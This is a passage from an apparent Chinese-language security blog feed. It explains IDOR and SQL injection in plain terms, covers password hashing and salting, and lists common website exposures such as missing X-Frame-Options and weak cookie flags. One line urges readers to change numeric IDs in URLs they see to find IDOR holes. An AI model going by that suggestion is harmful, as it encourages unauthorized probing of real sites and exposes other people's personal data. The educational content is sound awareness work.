&lt;li&gt;資料真的這麼容易外洩嗎？&lt;/li&gt;
&lt;li&gt;資料外洩之後，可能造成什麼後果？&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;我們先來看第一個問題，有很多安全性的漏洞可以造成資料外洩，而有些漏洞的攻擊方式，比你想的還簡單一百倍。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/huli/reset-password/p2.jpeg&quot; alt=&quot;Photo by Arget on Unsplash&quot;&gt;&lt;/p&gt;
&lt;p&gt;你想像中的駭客可能像上面那樣，打著一大堆不知道在幹嘛的指令，畫面上出現很多黑底白字或是綠字的畫面，完全搞不懂在幹嘛，但是做著做著網站就被打下來了。&lt;/p&gt;
&lt;p&gt;而事實上有些漏洞，可能在網址列上面改幾個字就攻擊成功了，就算你不懂任何程式也做得到。&lt;/p&gt;
&lt;p&gt;舉例來說好了，假設今天有個購物網站，你買了一些東西之後送出訂單，訂單成立後跳轉到訂單頁面，上面有著一大堆你的個資，例如說：姓名、收貨地址、聯絡電話以及 Email 等等。&lt;/p&gt;
&lt;p&gt;然後你發現訂單頁面的網址是 &lt;a href=&quot;https://shop.huli.tw/orders?id=14597&quot;&gt;https://shop.huli.tw/orders?id=14597&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;而正好你的訂單編號也是 14597，在好奇心的驅使之下，你就試著把數字改成 14596，然後按下 Enter。&lt;/p&gt;
&lt;p&gt;當網站載入完成之後，你竟然還真的能看到編號為 14596 的訂單，上面出現一個你不認識的人的姓名、收貨地址、聯絡電話跟 Email。&lt;/p&gt;
&lt;p&gt;有些攻擊就是這麼樸實無華且枯燥，只要改個字就能看到屬於其他人的資料。這時候如果你會寫程式的話，就可以寫個腳本自動去抓 id 是 1 一直到 id 是 15000 的資料，你就拿到了這個購物網站 15000 筆訂單的資訊，也就是一萬多個顧客的個資。&lt;/p&gt;
&lt;p&gt;這過程中沒有什麼黑底白字的畫面，也不用一直瘋狂打字，唯一需要的只有改數字，個資就輕鬆到手。&lt;/p&gt;
&lt;p&gt;這類型的漏洞有個專有名詞，稱為 IDOR，全名是：Insecure direct object references，大約就是不安全的直接資料存取的意思。漏洞產生的原因就是工程師在開發時，並沒有注意到權限控管，因此讓使用者能存取到其他人的資料。&lt;/p&gt;
&lt;p&gt;有些人看到這邊可能以為我只是為了文章淺顯易懂，所以才舉一個簡化的例子，現實生活中的攻擊才沒這麼簡單。&lt;/p&gt;
&lt;p&gt;這句話算是對了一半，大部分的網站確實都不會有這麼明顯的一個漏洞，攻擊方式會更複雜一點。但可怕的是，還真的有些網站就是這麼簡單，就是改個數字就可以拿到別人的資料。&lt;/p&gt;
&lt;p&gt;台灣有一個網站叫做 &lt;a href=&quot;https://zeroday.hitcon.org/&quot;&gt;HITCON ZeroDay&lt;/a&gt;，是由台灣駭客協會所維護的漏洞回報平台。有些人發現漏洞之後可能會竊取個資拿去賣，從事非法行為，也有些人發現漏洞只是為了鍛鍊技術，並沒有想要做什麼壞事。&lt;/p&gt;
&lt;p&gt;因此就可以透過這個平台進行回報，回報漏洞之後負責維護平台的志工們會幫你驗證漏洞，驗證過後回報給負責的廠商，讓他們去修復漏洞。&lt;/p&gt;
&lt;p&gt;這個平台上的漏洞在修復過後隔一陣子會公開，或者儘管廠商沒有回報修復，過一陣子（例如說兩個月）後也會公開，因此在這平台上可以找到許多公開的漏洞，看過之後你大概就不會想在網站註冊時留下真實個資了…&lt;/p&gt;
&lt;p&gt;例如說這兩個就是 IDOR 的真實漏洞：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://zeroday.hitcon.org/vulnerability/ZD-2021-00206&quot;&gt;享健身xarefit 任意訪問/下載所有會員個資&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://zeroday.hitcon.org/vulnerability/ZD-2021-00260&quot;&gt;DoorGods 防疫門神實聯制系統IDOR導致個資外洩&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;對，不要懷疑，就真的只是在網址上改個數字而已這麼容易。&lt;/p&gt;
&lt;p&gt;以後只要看到網址列上有這種數字，就可以試著去改改看，搞不好不會寫程式的你也可以發現 IDOR 的漏洞。&lt;/p&gt;
&lt;p&gt;除了這種只要改個東西的漏洞之外，還有另外一個很常見但是需要一點技術能力才能攻破的漏洞，叫做 SQL Injection。&lt;/p&gt;
&lt;p&gt;先來講講 SQL 是什麼，簡單來說就是跟資料庫查詢東西的一種程式語言。既然說是語言那就會有固定語法，若是以中文舉例，大概就像是：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;去找「訂單資料」，給我「id 是 1 的」，按照「建立時間」排序&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;用「」框起來的部分代表可以變動，而其他關鍵字例如說「去找」、「給我」這些都是固定的，因為語法要固定才能寫程式去解析。&lt;/p&gt;
&lt;p&gt;同樣以上面假想的購物網站為例，如果網址是 &lt;a href=&quot;https://shop.huli.tw/orders?id=14597%EF%BC%8C%E9%82%A3%E7%B6%B2%E7%AB%99%E5%8E%BB%E8%B7%9F%E8%B3%87%E6%96%99%E5%BA%AB%E6%8B%BF%E8%B3%87%E6%96%99%E6%99%82%EF%BC%8C%E6%8C%87%E4%BB%A4%E5%A4%A7%E6%A6%82%E5%B0%B1%E6%98%AF%EF%BC%9A&quot;&gt;https://shop.huli.tw/orders?id=14597，那網站去跟資料庫拿資料時，指令大概就是：&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;去找「訂單資料」，給我「id 是 14597 的」&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;因為網址列上的 id 是 14597 嘛，所以這個 id 就會被放到查詢的指令去，如果 id 是別的，那查詢的指令也會不一樣。&lt;/p&gt;
&lt;p&gt;這時候如果我的 id 不是數字，而是「1 的順便給我使用者資料」，查詢就變成：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;去找「訂單資料」，給我「id 是 1 的順便給我使用者資料」&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;那整個網站的使用者資料就順便被我抓下來了。&lt;/p&gt;
&lt;p&gt;這個攻擊之所以叫做 SQL injection，重點就在於那個 injection，攻擊者「注入」了一段文字被當作指令的一部分執行，所以攻擊者就可以執行任意查詢。&lt;/p&gt;
&lt;p&gt;比起上面講的 IDOR，SQL injection 通常會更為致命，因為不只是訂單資料本身，連其他資料也會被一起撈出來。所以除了訂單資料，會員資料跟商品資料都有可能一起外洩。&lt;/p&gt;
&lt;p&gt;這邊也隨便找兩個公開的案例：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://zeroday.hitcon.org/vulnerability/ZD-2020-00276&quot;&gt;北一女中網站存在SQL Injection漏洞&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://zeroday.hitcon.org/vulnerability/ZD-2021-00052&quot;&gt;桃園高中 網站 SQL injection&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;而防禦方式就是不要把使用者輸入的「1 的順便給我使用者資料」直接當作指令，而是經過一些處理，讓整段查詢變成：「給我 id 是：『1 的順便給我使用者資料』的資料」，那因為沒有這個 id，所以什麼事也不會發生。&lt;/p&gt;
&lt;h2 id=&quot;%E5%80%8B%E8%B3%87%E6%B4%A9%E6%BC%8F%E4%BA%86%EF%BC%8C%E7%84%B6%E5%BE%8C%E5%91%A2%EF%BC%9F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%80%8B%E8%B3%87%E6%B4%A9%E6%BC%8F%E4%BA%86%EF%BC%8C%E7%84%B6%E5%BE%8C%E5%91%A2%EF%BC%9F&quot;&gt;#&lt;/a&gt; 個資洩漏了，然後呢？&lt;/h2&gt;
&lt;p&gt;前面我們已經看到了針對那些沒有做好防禦的網站，個資外洩是多麽容易的一件事情。&lt;/p&gt;
&lt;p&gt;那個資洩漏之後，對使用者會有什麼影響呢？&lt;/p&gt;
&lt;p&gt;大家最感同身受的應該就是詐騙電話吧，例如說某些買書的網站或是訂房網站，打過來跟你說什麼要分期退款，為了博取你的信任，連你買了哪本書，訂了哪個房間，或是你家地址跟姓名全都講得出來。&lt;/p&gt;
&lt;p&gt;這些都是因為資料外洩的緣故，詐騙集團才會知道的這麼清楚。&lt;/p&gt;
&lt;p&gt;但除了這些個資以外，還有兩個東西也會外洩，那就是你的帳號跟密碼。&lt;/p&gt;
&lt;p&gt;也許你會想說：「不就帳號跟密碼嗎，我就在那個網站上面改密碼以後再用就好啦！」&lt;/p&gt;
&lt;p&gt;事情也許沒有你想的這麼簡單。如果你沒有用密碼管理軟體的話，我大膽猜測你所有的密碼可能都是同一組。因為怕記不起來嘛，所以乾脆都用同一組密碼。&lt;/p&gt;
&lt;p&gt;這時候如果帳密外洩，駭客是不是就可以拿這組帳密去其他服務試試看？&lt;/p&gt;
&lt;p&gt;拿去登你的 Google，登你的 Facebook，這時候用同一組密碼的人就會被登進去。所以從表面看只是一個購物網站被入侵，但造成的結果卻是你的 Google 還有 Facebook 也一起被盜了。&lt;/p&gt;
&lt;p&gt;所以，有時候某個網站被盜帳號可能不是那個網站的問題，而是駭客在其他地方拿到了你的帳號密碼，就來這邊試試看，沒想到就中了。&lt;/p&gt;
&lt;p&gt;對於網站的開發者而言，保護好使用者的個資是天經地義的事情，保護密碼也是，有沒有什麼好方法可以保護密碼呢？&lt;/p&gt;
&lt;p&gt;加密嗎？把密碼用某些演算法加密，這樣資料庫儲存的就會是加密後的結果，儘管被偷走了，駭客只要沒有解密的方法就解不開。&lt;/p&gt;
&lt;p&gt;聽起來似乎是最安全的做法了，但其實還有一個問題，那就是網站的開發者還是會知道怎麼解密，如果有工程師監守自盜怎麼辦？他還是可以知道每個使用者的密碼是什麼，可以把這些資訊拿去賣或者是自己利用。&lt;/p&gt;
&lt;p&gt;嗯…似乎我們也不能怎麼樣，因為無論如何，開發者都需要有方法知道資料庫存的密碼究竟是多少吧？不然在登入的時候怎麼確認帳號密碼是對的？&lt;/p&gt;
&lt;p&gt;再者，這樣聽起來應該夠安全了，要怎麼樣才能更安全？難道要連網站的開發者都無法解密，都不知道密碼是什麼才夠安全嗎？&lt;/p&gt;
&lt;p&gt;Bingo！答對了，就是要這樣沒錯！&lt;/p&gt;
&lt;h2 id=&quot;%E6%B2%92%E6%9C%89%E4%BA%BA%E7%9F%A5%E9%81%93%E4%BD%A0%E7%9A%84%E5%AF%86%E7%A2%BC%EF%BC%8C%E5%8C%85%E6%8B%AC%E7%B6%B2%E7%AB%99%E6%9C%AC%E8%BA%AB&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%B2%92%E6%9C%89%E4%BA%BA%E7%9F%A5%E9%81%93%E4%BD%A0%E7%9A%84%E5%AF%86%E7%A2%BC%EF%BC%8C%E5%8C%85%E6%8B%AC%E7%B6%B2%E7%AB%99%E6%9C%AC%E8%BA%AB&quot;&gt;#&lt;/a&gt; 沒有人知道你的密碼，包括網站本身&lt;/h2&gt;
&lt;p&gt;事實上，網站的資料庫是不會儲存你的密碼的。&lt;/p&gt;
&lt;p&gt;或更精確地說，不會儲存你的「原始密碼」，但會儲存密碼經過某種運算後的結果，而且最重要的是，這個運算是無法還原的。&lt;/p&gt;
&lt;p&gt;直接舉例比較快，假設今天有個很簡單的演算法，可以把密碼做轉換，轉換方式是：「數字不做轉換，英文字母把 a 換成 1，b 換成 2…z 換成 26」，以此類推，第幾個字母就換成幾，大小寫不分都一樣（先假設不會有符號）。&lt;/p&gt;
&lt;p&gt;如果密碼是 abc123，轉換完就變成 123123。&lt;/p&gt;
&lt;p&gt;在使用者註冊的時候，網站就把使用者輸入的 abc123 轉成 123123，然後存到資料庫裡面。因此資料庫存的密碼是 123123，而不是 abc123。&lt;/p&gt;
&lt;p&gt;當使用者登入時，我們就再把輸入的值用同樣的邏輯轉換，如果輸入一樣，轉換後的結果就會一樣對吧？就知道密碼是不是正確的。&lt;/p&gt;
&lt;p&gt;當駭客把資料庫偷走以後，會拿到 123123 這組密碼，那一樣啊，不是可以推論出原本是 abc123 嗎？不不不，沒這麼簡單。&lt;/p&gt;
&lt;p&gt;123123、abcabc、12cab3…這些密碼轉換之後，不也是 123123 嗎？所以儘管知道轉換規則跟結果，卻沒有辦法還原成「唯一一組密碼」，這就是這個演算法厲害的地方！&lt;/p&gt;
&lt;p&gt;這樣的轉換就叫做雜湊（Hash），abc123 每次 hash 過後的結果都會是 123123，但是從 123123 卻無法推回輸入一定是 abc123，因為有其他種可能性存在。&lt;/p&gt;
&lt;p&gt;這就是 hash 跟加密最大的不同。&lt;/p&gt;
&lt;p&gt;加密跟解密是成對的，如果可以加密就一定可以解密，所以你知道密文跟密鑰，就可以知道明文。但 hash 不同，你知道 hash 的演算法跟結果，卻無法回推出原本的輸入是什麼。&lt;/p&gt;
&lt;p&gt;而這個機制最常見的應用之一，就在於密碼的儲存。&lt;/p&gt;
&lt;p&gt;在註冊時把 hash 過後的密碼存進資料庫，登入時把輸入的密碼 hash 過後跟資料庫比對，就知道密碼是否正確。就算資料庫被偷，駭客也不知道使用者的密碼是什麼，因為回推不出來。&lt;/p&gt;
&lt;p&gt;這就是為什麼忘記密碼的時候，網站不會跟你講原本的密碼是什麼，因為網站本身也不知道啊！&lt;/p&gt;
&lt;p&gt;所以不能「找回密碼」，只能「重設密碼」，因為重設就代表你輸入新的密碼，然後網站把新的密碼 hash 之後存進資料庫，未來登入時就會用這組新的 hash 去比對。&lt;/p&gt;
&lt;p&gt;有些人可能會注意到這樣的儲存方式似乎有個漏洞，延續前面的例子，資料庫存的是 123123 而我的原始密碼是 abc123，這樣如果用「abcabc」，hash 過後也是 123123，不就也可以登入嗎？這樣不太對吧，這不是我的密碼欸&lt;/p&gt;
&lt;p&gt;有兩個不同的輸入卻產生出同一組輸出，這種狀況稱為碰撞（hash collision），碰撞一定會發生，但如果演算法設計的好，碰撞的機率就超級無敵小，小到幾乎可以忽略。&lt;/p&gt;
&lt;p&gt;前面提的轉換規則只是為了方便舉例，真實世界中用的演算法複雜許多，就算只有一個字不同，結果都會天差地遠，以 SHA256 這個演算法為例：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;abc123 =&amp;gt; 6ca13d52ca70c883e0f0bb101e425a89e8624de51db2d2392593af6a84118090&lt;/li&gt;
&lt;li&gt;abc124 =&amp;gt; cd7011e7a6b27d44ce22a71a4cdfc2c47d5c67e335319ed7f6ae72cc03d7d63f&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;類似的輸入卻產生截然不同的輸出。&lt;/p&gt;
&lt;p&gt;像我前面舉例用的轉換就是不安全的 hash 演算法，要盡量避免使用或是避免自己設計，盡可能使用密碼學家跟專家設計出的演算法，像是上面提到的 SHA256。&lt;/p&gt;
&lt;p&gt;在使用這些演算法的時候，也要特別注意一下是否安全，因為有些演算法雖然也是由專家設計，但已經被證明是不安全的，例如說密碼用 MD5 來 hash 後儲存就是不安全的，可以參考：&lt;a href=&quot;https://security.stackexchange.com/questions/19906/is-md5-considered-insecure&quot;&gt;Is MD5 considered insecure?&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;%E6%89%80%E4%BB%A5%EF%BC%8C%E5%84%B2%E5%AD%98-hash-%E5%BE%8C%E7%9A%84%E5%80%BC%E5%B0%B1%E6%B2%92%E4%BA%8B%E4%BA%86%E5%97%8E%EF%BC%9F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%89%80%E4%BB%A5%EF%BC%8C%E5%84%B2%E5%AD%98-hash-%E5%BE%8C%E7%9A%84%E5%80%BC%E5%B0%B1%E6%B2%92%E4%BA%8B%E4%BA%86%E5%97%8E%EF%BC%9F&quot;&gt;#&lt;/a&gt; 所以，儲存 hash 後的值就沒事了嗎？&lt;/h2&gt;
&lt;p&gt;抱歉，其實只儲存密碼 hash 過後的值是不夠的。&lt;/p&gt;
&lt;p&gt;咦，為什麼？我剛剛不是說沒辦法反推出結果嗎，那為什麼不夠？&lt;/p&gt;
&lt;p&gt;雖然說沒辦法反推出結果，但攻擊者可以利用「輸入一樣，輸出一定一樣」的特性，先建好一個資料庫。&lt;/p&gt;
&lt;p&gt;舉例來說，假設有個很常見的密碼 abc123，hash 過後的值是 6ca13d，那攻擊者就可以先算好，然後把這個關係存在資料庫，所以攻擊者的資料庫裡面就可能會有一百萬組最常見密碼的清單，裡面有著每個密碼跟它 hash 過後的值。&lt;/p&gt;
&lt;p&gt;那接下來只要在 hash 過後的資料庫發現 6ca13d，攻擊者就可以透過查表的方式，查出原本的密碼是 abc123。這不是利用演算法反推結果，這只是利用現有資料來查詢而已。&lt;/p&gt;
&lt;p&gt;為了防禦這種攻擊，還要做一件事情叫做加鹽（Salting），沒錯，就是鹽巴的那個鹽。通常會幫每個使用者產生一個獨一無二的鹽巴，例如說 5ab3od（實際上會更長，可能 16 或 32 個字以上），接著把我的密碼 abc123 加上我的鹽巴，變成 abc1235ab3od，然後用這個加鹽過後的結果去做 hash。&lt;/p&gt;
&lt;p&gt;為什麼要這樣做呢？&lt;/p&gt;
&lt;p&gt;因為攻擊者預先準備好的表格中，比起 abc123，出現 abc1235ab3od 的機率顯然更低，同時又因為長度變長了，暴力破解的難度變得更高。如此一來，密碼就變得更難破解了。&lt;/p&gt;
&lt;p&gt;更多資訊請參考：&lt;a href=&quot;https://www.ithome.com.tw/voice/127918&quot;&gt;不是祕密的祕密&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;%E7%B5%90%E8%AA%9E&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B5%90%E8%AA%9E&quot;&gt;#&lt;/a&gt; 結語&lt;/h2&gt;
&lt;p&gt;忘記密碼時網站不會把密碼寄給我，因為網站自己都不知道我的密碼是什麼。雖然聽起來不太可能，但實際狀況就是如此。為了安全性，這是必須的手段。&lt;/p&gt;
&lt;p&gt;要達成這樣的目的，背後最重要的技術原理就是 hash，「同樣的密碼會產生同樣的 hash 值，但從 hash 值沒辦法對應回原本的密碼」就是秘訣所在。&lt;/p&gt;
&lt;p&gt;反之，如果你發現有網站可以找回你的密碼，那就得要多加注意，有可能網站資料庫存的不是 hash 值而是你的密碼。在這種狀況下，萬一有天資料庫被入侵，帳密被偷走，駭客就能得知你真實的密碼，然後去試其他的服務。&lt;/p&gt;
&lt;p&gt;有關於密碼管理，現在瀏覽器也有功能可以自動幫你產生密碼外加記憶密碼，或也可以使用現成的密碼管理軟體，都可以在不同網站產生不同的密碼。&lt;/p&gt;
&lt;p&gt;這篇希望能讓對這個領域陌生的讀者們也能知道一些基本的概念，包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;有些網站比你想得脆弱很多，改個網址就可以拿到別人的資料&lt;/li&gt;
&lt;li&gt;對於安全性做得不好的網站，拿到整個資料庫不是一件難事&lt;/li&gt;
&lt;li&gt;忘記密碼只能重設，不能找回，是因為網站也不知道你的密碼&lt;/li&gt;
&lt;li&gt;如果有網站可以把舊密碼給你，那你得要小心一點&lt;/li&gt;
&lt;/ol&gt;

		</content>
	</entry>
	
	<entry>
		<title>資安科普番外篇（一）-大意了啊沒有閃！常見網站曝險你中了幾項？！</title>
		<link href="https://tech-blog.cymetrics.io/posts/jo/zerobased-common-risk-exposure/"/>
		<updated>2021-07-09T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/jo/zerobased-common-risk-exposure/</id>
		<content type="html">
		  &lt;!-- summary --&gt;
&lt;h2 id=&quot;%E5%89%8D%E8%A8%80&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%89%8D%E8%A8%80&quot;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;曝險就是暴露的風險，而曝險評估就是&lt;strong&gt;模擬駭客在網路上搜尋網站的資訊進行攻擊鏈的構建進行暴露的風險評估&lt;/strong&gt;，而在協助許多商業網站（ e.g. 擁有會員登入、金流功能）執行非侵入式的網路曝險檢測時，發現許多商業網站的檢測結果在去除極端值後，有 60% 以上的網站曝險是共通的，來關注一下這些常見的網路曝險你的網站是否也大意了沒有閃。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;!-- summary --&gt;
&lt;h2 id=&quot;%E6%91%98%E8%A6%81&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%91%98%E8%A6%81&quot;&gt;#&lt;/a&gt; 摘要&lt;/h2&gt;
&lt;p&gt;以去除極端值之後的檢測結果統計，排列出目前發生比例大於 50 % 的網路曝險，並說明&lt;strong&gt;可能造成的風險&lt;/strong&gt;以及如何簡單的進行&lt;strong&gt;初步自我曝險檢測&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;之後會在番外篇（二 ）中提供這幾項&lt;strong&gt;風險的改善複雜度&lt;/strong&gt;說明以及解決辦法和關鍵字，另外也會說明這些曝險與目前現行一些較為&lt;strong&gt;知名法規的關聯&lt;/strong&gt;。&lt;/p&gt;
&lt;h2 id=&quot;%E5%B8%B8%E8%A6%8B%E7%B6%B2%E7%AB%99%E6%9B%9D%E9%9A%AA%E6%8E%92%E5%90%8D&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%B8%B8%E8%A6%8B%E7%B6%B2%E7%AB%99%E6%9B%9D%E9%9A%AA%E6%8E%92%E5%90%8D&quot;&gt;#&lt;/a&gt; 常見網站曝險排名&lt;/h2&gt;
&lt;h2 id=&quot;%E2%84%96%EF%BC%95-x-frame-options-%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E2%84%96%EF%BC%95-x-frame-options-%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3&quot;&gt;#&lt;/a&gt; №５ X-Frame-Options 未設置或安全等級不足&lt;/h2&gt;
&lt;p&gt;排行第五的 X-Frame-Options 設置，在這個項目裡有大於 50％ 的網站設置的安全等級不足或是沒有進行設置，X-Frame-Options 用途為&lt;strong&gt;針對 Iframe 點擊劫持攻擊&lt;/strong&gt;的手法進行防禦，避免網頁被內嵌。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;點擊劫持攻擊&lt;/strong&gt;是一種攻擊者在網站上通過 iframe 隱藏目標網頁，欺騙用戶點擊隱藏惡意連結，舉例來說，覆蓋在影片播放鍵上的隱藏超連結，當使用者點擊後，便會下載惡意程式或是彈出惡意網頁讓使用者瀏覽，讓使用者的機敏資訊外洩而導致資安事件的發生，這樣的攻擊很有可能會使網站業者的商譽受到損害。&lt;/p&gt;
&lt;p&gt;而發生此項曝險表示當攻擊者獲取這項資訊時，很有可能會嘗試對網站進行 Iframe 點擊劫持的攻擊手法。&lt;/p&gt;
&lt;h3 id=&quot;%E6%96%B0%E8%81%9E%E5%8F%83%E8%80%83%EF%BC%9A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%96%B0%E8%81%9E%E5%8F%83%E8%80%83%EF%BC%9A&quot;&gt;#&lt;/a&gt; 新聞參考：&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://nakedsecurity.sophos.com/2019/08/29/web-clickjacking-fraud-makes-a-comeback-thanks-to-javascript-tricks/&quot;&gt;&lt;strong&gt;Web clickjacking fraud makes a comeback thanks to JavaScript tricks&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;%E5%88%9D%E6%AD%A5%E8%87%AA%E6%88%91%E6%AA%A2%E8%A6%96%E6%96%B9%E5%BC%8F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%88%9D%E6%AD%A5%E8%87%AA%E6%88%91%E6%AA%A2%E8%A6%96%E6%96%B9%E5%BC%8F&quot;&gt;#&lt;/a&gt; 初步自我檢視方式&lt;/h3&gt;
&lt;p&gt;按下 F12 後，點選 Network 在左方開啟想要檢視的檔案，接著選擇 Header 便可以查看是否有設置 &lt;a href=&quot;https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Headers/X-Frame-Options#%E4%BD%BF%E7%94%A8_x-frame-options&quot;&gt;X-Frame-Options&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/jo/zerobased-common-risk-exposure/p1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;X-Frame-Options有三種值：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;DENY&lt;/code&gt;表示網頁無論如何都無法被嵌入到 frame 中，即使於相同網域內嵌入也不允許。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;SAMEORIGIN&lt;/code&gt;唯有當符合&lt;a href=&quot;https://developer.mozilla.org/zh-TW/docs/Web/Security/Same-origin_policy&quot;&gt;同源政策&lt;/a&gt;下，才能被嵌入到 frame 中。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ALLOW-FROM _uri_&lt;/code&gt;［已廢止］唯有列表許可的 URI 才能嵌入到 frame 中，不過新版瀏覽器已不再支援此指令。&lt;/p&gt;
&lt;h2 id=&quot;%E2%84%96%EF%BC%94cookie-%E5%9F%BA%E6%9C%AC%E8%A8%AD%E5%AE%9A%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E2%84%96%EF%BC%94cookie-%E5%9F%BA%E6%9C%AC%E8%A8%AD%E5%AE%9A%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3&quot;&gt;#&lt;/a&gt; №４Cookie 基本設定未設置或安全等級不足&lt;/h2&gt;
&lt;p&gt;排名第四的 Cookie 基本設定未設置或安全等級不足，在這個項目裡有大於 60％ 的網站設置安全等級不足或是沒有進行設置，而 Cookie 的三項基本設定為，能夠&lt;strong&gt;阻止（ XSS ）跨站腳本攻擊影響擴大&lt;/strong&gt;的 HttpOnly 、&lt;strong&gt;強化 Https 機制&lt;/strong&gt;的 Secure 以及&lt;strong&gt;預防（ CSRF ）跨站請求偽冒&lt;/strong&gt;的 SameSite 。&lt;/p&gt;
&lt;p&gt;由於三項安全設定也同樣都是網站公開資訊，在相關資訊容易被取得的情況下使三項基本設定很容易成為攻擊者篩選攻擊標的第一層過濾，也就是當攻擊者發現這三項設定設置不全甚至未設置的網站業者，攻擊者會特別關注，將網站納入攻擊的標的清單。&lt;/p&gt;
&lt;h3 id=&quot;xss-%E8%B7%A8%E7%AB%99%E8%85%B3%E6%9C%AC%E6%94%BB%E6%93%8A%EF%BC%9A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#xss-%E8%B7%A8%E7%AB%99%E8%85%B3%E6%9C%AC%E6%94%BB%E6%93%8A%EF%BC%9A&quot;&gt;#&lt;/a&gt; XSS 跨站腳本攻擊：&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://tech-blog.cymetrics.io/jo/zerobased-cross-site-scripting&quot;&gt;&lt;strong&gt;零基礎資安系列（二）-認識 XSS（Cross-Site Scripting）&lt;/strong&gt;&lt;br&gt;
&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;csrf-%E8%B7%A8%E7%AB%99%E8%AB%8B%E6%B1%82%E5%81%BD%E5%86%92%EF%BC%9A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#csrf-%E8%B7%A8%E7%AB%99%E8%AB%8B%E6%B1%82%E5%81%BD%E5%86%92%EF%BC%9A&quot;&gt;#&lt;/a&gt; CSRF 跨站請求偽冒：&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://tech-blog.cymetrics.io/jo/zerobased-cross-site-request-forgery&quot;&gt;&lt;strong&gt;零基礎資安系列（一）-認識 CSRF（Cross Site Request Forgery）&lt;/strong&gt;&lt;br&gt;
&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;%E6%96%B0%E8%81%9E%E5%8F%83%E8%80%83%EF%BC%9A-2&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%96%B0%E8%81%9E%E5%8F%83%E8%80%83%EF%BC%9A-2&quot;&gt;#&lt;/a&gt; 新聞參考：&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://www.ithome.com.tw/news/111254&quot;&gt;&lt;strong&gt;麥當勞官網遭爆有XSS漏洞，可解密竊取用戶密碼&lt;/strong&gt;&lt;br&gt;
&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;%E5%88%9D%E6%AD%A5%E8%87%AA%E6%88%91%E6%AA%A2%E8%A6%96%E6%96%B9%E5%BC%8F-2&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%88%9D%E6%AD%A5%E8%87%AA%E6%88%91%E6%AA%A2%E8%A6%96%E6%96%B9%E5%BC%8F-2&quot;&gt;#&lt;/a&gt; 初步自我檢視方式&lt;/h3&gt;
&lt;p&gt;因為這堪稱網站安全三本柱的三個基本設定，為了三項基本設定寫了一篇文章，提供自我檢視風險的方式以及更深入的說明，有興趣了解更多關於 Cookie 三項基本設定資訊的朋友可以參考下方文章&lt;/p&gt;
